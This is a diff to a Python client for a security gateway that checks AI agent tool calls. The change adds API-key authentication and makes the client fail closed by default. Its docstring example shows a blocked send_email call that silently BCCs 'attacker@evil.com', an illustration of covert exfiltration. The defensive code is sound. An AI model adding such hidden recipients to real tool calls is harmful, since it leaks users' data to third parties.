@@ -9,22 +9,21 @@ Example
 -------
     from mcp_monitor.client import GatewayClient
 
-    gw = GatewayClient("http://localhost:8000")
+    gw = GatewayClient("http://localhost:8000", api_key="replace-with-secret")
 
     @gw.guard
     def send_email(**kwargs):
-        # your real tool implementation
         return smtp_send(**kwargs)
 
     # Blocked calls raise ToolBlocked before the real tool runs:
     send_email(server_id="postmark", to="u@x.com", bcc="attacker@evil.com")
 
-Or scan explicitly:
-
-    verdict = gw.scan({"name": "email.send", "server_id": "postmark",
-                       "arguments": {"to": "u@x.com", "bcc": "evil@x.com"}})
-    if not verdict["allowed"]:
-        raise RuntimeError("blocked")
+Availability policy
+-------------------
+Security-critical deployments fail closed by default. If the gateway is
+unreachable, the wrapped tool call is blocked. Monitoring-only callers can
+explicitly opt into ``fail_closed=False`` after considering the availability
+trade-off.
 """
 
 from __future__ import annotations
@@ -49,15 +48,15 @@ class ToolBlocked(Exception):
 
 
 class GatewayClient:
-    """Thin HTTP client for the MCP security gateway's /api/scan endpoint.
+    """Thin HTTP client for the MCP security gateway's ``/api/scan`` endpoint.
 
-    Availability policy
-    -------------------
-    ``fail_closed`` selects what happens when the gateway is unreachable (network
-    error, timeout, non-2xx). The default is **fail-open** so that a monitoring
-    deployment never takes the agent down when the gateway blips. Security-
-    critical deployments should pass ``fail_closed=True`` so an unreachable
-    gateway causes tool calls to be *blocked* rather than silently allowed.
+    Args:
+        base_url: Absolute HTTP(S) gateway endpoint.
+        timeout: Per-request timeout in seconds.
+        api_key: Optional gateway API key. When supplied, sent as ``X-API-Key``.
+            The production gateway rejects anonymous protected requests.
+        fail_closed: Transport availability policy. Defaults to ``True`` so an
+            unreachable gateway blocks execution instead of silently allowing it.
     """
 
     def __init__(
@@ -65,42 +64,44 @@ class GatewayClient:
         base_url: str = "http://localhost:8000",
         timeout: float = 5.0,
         *,
-        fail_closed: bool = False,
+        api_key: str | None = None,
+        fail_closed: bool = True,
     ) -> None:
         normalized_url = base_url.rstrip("/")
         parsed = urlparse(normalized_url)
         if parsed.scheme not in {"http", "https"} or not parsed.netloc:
             raise ValueError("GatewayClient base_url must be an absolute HTTP or HTTPS endpoint")
+        if timeout <= 0:
+            raise ValueError("GatewayClient timeout must be greater than zero")
         self.base_url = normalized_url
         self.timeout = timeout
+        self.api_key = api_key
         self.fail_closed = fail_closed
 
     def scan(self, tool_call: dict[str, Any]) -> dict[str, Any]:
         """POST a tool call to the gateway and return the verdict dict.
 
-        The gateway records the event and streams it to the live dashboard.
-
-        Availability behaviour on transport error is governed by ``fail_closed``
-        (set at construction):
-
-        - ``fail_closed=False`` (default): return an allowing verdict so the
-          gateway being down never breaks the agent (fail-open).
-        - ``fail_closed=True``: return a blocking verdict so an unreachable
-          gateway causes the call to be blocked (fail-closed).
+        Transport or non-2xx failures are treated as unavailable-gateway events
+        and follow ``fail_closed``. A protected gateway's HTTP 401 is therefore
+        blocking in the default security-oriented mode.
         """
         data = json.dumps(tool_call).encode("utf-8")
+        headers = {"Content-Type": "application/json"}
+        if self.api_key:
+            headers["X-API-Key"] = self.api_key
         req = urllib.request.Request(
             f"{self.base_url}/api/scan",
             data=data,
-            headers={"Content-Type": "application/json"},
+            headers=headers,
             method="POST",
         )
         try:
-            # base_url is validated in __init__ to be an absolute HTTP(S) URL.
             with urllib.request.urlopen(req, timeout=self.timeout) as resp:  # nosec B310
-                return json.loads(resp.read().decode("utf-8"))
+                payload = json.loads(resp.read().decode("utf-8"))
+                if not isinstance(payload, dict):
+                    raise ValueError("Gateway response must be a JSON object")
+                return payload
         except (urllib.error.URLError, TimeoutError, OSError, ValueError) as exc:
-            # Transport-level failure: apply the configured availability policy.
             return {
                 "call_id": None,
                 "allowed": not self.fail_closed,
@@ -130,7 +131,7 @@ class GatewayClient:
                 "arguments": {k: v for k, v in kwargs.items() if k != "server_id"},
             }
             verdict = self.scan(tool_call)
-            if not verdict.get("allowed", True):
+            if not verdict.get("allowed", False):
                 raise ToolBlocked(verdict)
             return fn(*args, **kwargs)
 
